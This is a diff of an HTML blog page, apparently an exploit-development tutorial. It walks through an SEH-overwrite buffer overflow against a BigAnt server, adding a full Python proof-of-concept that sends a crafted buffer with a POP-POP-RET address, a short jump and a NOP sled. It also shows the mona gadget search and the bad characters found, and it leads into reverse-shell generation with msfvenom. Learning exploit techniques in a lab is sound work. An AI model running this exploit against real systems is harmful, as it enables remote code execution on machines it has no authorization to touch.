@@ -470,9 +470,9 @@ s.close()
 buffer = "USV /.:/" + "A" * 962 + "B" * 4 + "C" * (5000-962-4) + "\r\n\r\n"
 </pre></table></code></div></div><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/bigant_09.png?raw=true" alt="Fuzzing results" /></p><p>In order to exploit SEH overwrite, we need to find <code class="language-plaintext highlighter-rouge">POP, POP, RET</code> instruction sequence in order to reach our payload on the stack. To find <code class="language-plaintext highlighter-rouge">POP, POP, RET</code> mona can be used as follows:</p><p><code class="language-plaintext highlighter-rouge">!mona findwild -s "POP R32# POP R32# RET"</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/bigant_10.png?raw=true" alt="Fuzzing results" /></p><p>We can try any address which doesn’t have common bad characters (<code class="language-plaintext highlighter-rouge">\x00\x0a\x0d</code>) and it is located within “SafeSEH: False” module, for example this one:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre><td class="rouge-code"><pre>POP, POP, RETN: 0x1b070c69
+</pre><td class="rouge-code"><pre>#POP, POP, RETN: 0x1b070c69
 SEH = "\x69\x0c\x07\x1b"
-</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><ul><li>PoC script updated with SEH address:</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -499,14 +499,50 @@ port = 6660
 # pop, pop, ret 0x1b070c69
 SEH = "\x69\x0c\x07\x1b"
 
-buffer = "USV /.:/" + "A" * 962 + JMP + SEH + "\x90" * 10 + "C" * (5000 - 962 - len(SEH) - 10) + "\r\n\r\n"
+buffer = "USV /.:/" + "A" * 962 + SEH + "\x90" * 10 + "C" * (5000 - 962 - len(SEH) - 10) + "\r\n\r\n"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
 s.send(buffer)
 print ("[+] Payload sent")
 s.close()
-</pre></table></code></div></div><p>Great, we land 4 bytes in front of overwritten SEH address.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/bigant_11.png?raw=true" alt="Fuzzing results" /></p><p>As next step we need to use those 4 bytes to perform uncoditional jump over SEH address (<code class="language-plaintext highlighter-rouge">"\xeb\x07"</code>).</p><h2 id="bad-characters-and-shell-code">Bad characters and shell code</h2><p>Process of finding bad characters was explained several times in previous blog posts. Following chars were eventually found to be bad: <code class="language-plaintext highlighter-rouge">"\x00\x0a\x0d\x20\x25"</code></p><p>Based on that information we can use msfvenom to generate reverse shell code without bad characters:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>Great, we land 4 bytes in front of overwritten SEH address.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://github.com/smarinovic/smarinovic.github.io/blob/master/assets/img/bigant_11.png?raw=true" alt="Fuzzing results" /></p><p>As next step we need to use those 4 bytes to perform uncoditional jump over SEH address (<code class="language-plaintext highlighter-rouge">"\xeb\x07"</code>).</p><ul><li>PoC script updated with jump over SEH:</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>#!/usr/bin/python
+
+import socket
+
+host = "172.16.24.213"
+port = 6660
+
+# pop, pop, ret 0x1b070c69
+SEH = "\x69\x0c\x07\x1b"
+JMP = "\xeb\x07"
+
+buffer = "USV /.:/" + "A" * 962 + JMP + SEH + "\x90" * 10 + "C" * (5000 - 962 - len(SEH) - len(JMP) - 10) + "\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+s.send(buffer)
+print ("[+] Payload sent")
+s.close()
+</pre></table></code></div></div><h2 id="bad-characters-and-shell-code">Bad characters and shell code</h2><p>Process of finding bad characters was explained several times in previous blog posts. Following chars were eventually found to be bad: <code class="language-plaintext highlighter-rouge">"\x00\x0a\x0d\x20\x25"</code></p><p>Based on that information we can use msfvenom to generate reverse shell code without bad characters:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
